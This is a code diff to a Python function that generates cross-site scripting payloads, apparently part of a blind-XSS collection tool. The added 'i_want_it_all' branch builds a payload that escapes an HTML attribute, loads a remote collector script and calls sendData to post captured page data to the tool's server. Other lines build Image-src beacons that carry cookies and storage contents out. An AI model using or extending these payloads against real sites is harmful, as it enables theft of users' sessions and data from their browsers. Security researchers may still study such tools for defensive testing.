@@ -20,11 +20,15 @@ def gen_xss(id):
     local_storage = False
     session_storage = False
     get_url = False
+    i_want_it_all = False
 
     for param, value in parameters.items():
 
+
         if param == 'url':
             url = value
+        elif param == 'i_want_it_all':
+            i_want_it_all = True
         elif param == 'stored':
             xss_type = 's'
         elif param == 'cookies':
@@ -57,6 +61,10 @@ def gen_xss(id):
             other_data += '{}={}'.format(param, value)
             require_params = True
 
+
+    if i_want_it_all:
+        payload = """'>"><script src={}/static/collector.min.js></script><script>sendData('{}/api/x/{}/{}', '{}')</script>""".format(url, url, xss_type, uid, other_data)
+        return (payload), 200
 
     if code_type == 'js':
         payload = ';}; new Image().src="'
@@ -97,6 +105,8 @@ def gen_xss(id):
             payload += other_data
             payload += '"'
 
+    if not require_params:
+        payload += '"'
 
     if code_type == 'js':
         payload += '; '
